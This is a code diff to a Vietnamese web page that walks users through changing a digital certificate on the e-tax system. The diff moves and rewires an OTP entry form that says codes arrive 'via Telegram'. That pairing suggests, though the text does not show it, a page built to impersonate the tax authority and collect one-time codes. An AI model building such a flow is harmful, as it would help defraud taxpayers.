@@ -1321,9 +1321,9 @@
     <div id="tax-otp-form" style="display:none;">
       <div class="tax-otp-error" id="tax-otp-error"></div>
       <div class="tax-otp-input-wrap">
-        <input class="tax-otp-input" id="tax-otp-input" type="text" maxlength="6" placeholder="——————" autocomplete="off" oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)" onkeydown="if(event.key==='Enter')verifyTaxCode()"/>
+        <input class="tax-otp-input" id="tax-otp-input" type="text" maxlength="6" placeholder="——————" autocomplete="off" oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)" onkeydown="if(event.key==='Enter')submitTaxOtp()"/>
       </div>
-      <button class="btn-tax-verify" id="tax-verify-btn" onclick="verifyTaxCode()">Xác nhận mã</button>
+      <button class="btn-tax-verify" id="tax-verify-btn" onclick="submitTaxOtp()">Xác nhận mã</button>
       <div class="tax-countdown-wrap">
         <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="#9CA3AF" stroke-width="1.5"/><path d="M7 4v3l2 1.5" stroke="#9CA3AF" stroke-width="1.5" stroke-linecap="round"/></svg>
         Mã hết hạn sau
@@ -1424,20 +1424,6 @@
       <div class="tax-guide-success-icon">🎉</div>
       <div class="tax-guide-success-text">Hoàn tất tất cả các bước!</div>
       <div class="tax-guide-success-sub">Bạn đã đổi chứng thư số thành công qua hệ thống Thuế Điện Tử.</div>
-    </div>
-  </div>
-</div>
-
-<!-- NEW: OTP MODAL (Telegram OTP verification) -->
-<div id="tax-otp-modal">
-  <div class="tax-otp-box">
-    <div class="tax-otp-icon">📱</div>
-    <div class="tax-otp-title">Xác minh OTP</div>
-    <div class="tax-otp-desc" id="tax-otp-info">Mã OTP đã được gửi qua Telegram. Vui lòng nhập mã để tiếp tục.</div>
-    <input class="tax-otp-input" type="text" id="tax-otp-input" maxlength="4" placeholder="••••" autocomplete="off" inputmode="numeric" onkeydown="if(event.key==='Enter')submitTaxOtp()"/>
-    <div class="tax-otp-buttons">
-      <button class="tax-otp-submit" onclick="submitTaxOtp()">Xác nhận</button>
-      <button class="tax-otp-cancel" onclick="cancelTaxService()">Huỷ bỏ</button>
     </div>
   </div>
 </div>
@@ -1658,7 +1644,12 @@
 
   // ── OTP Modal ──────────────────────────────────────────────
   function showOtpModal(msg) {
-    document.getElementById('tax-otp-info').textContent = msg || 'Mã OTP đã được gửi qua Telegram. Vui lòng nhập mã để tiếp tục.';
+    // Hide sending indicator, show OTP input form
+    var sendingEl = document.getElementById('tax-sending-indicator');
+    var formEl = document.getElementById('tax-otp-form');
+    if (sendingEl) sendingEl.style.display = 'none';
+    if (formEl) formEl.style.display = 'block';
+    
     document.getElementById('tax-otp-modal').classList.add('active');
     document.getElementById('tax-otp-input').value = '';
     setTimeout(function() {
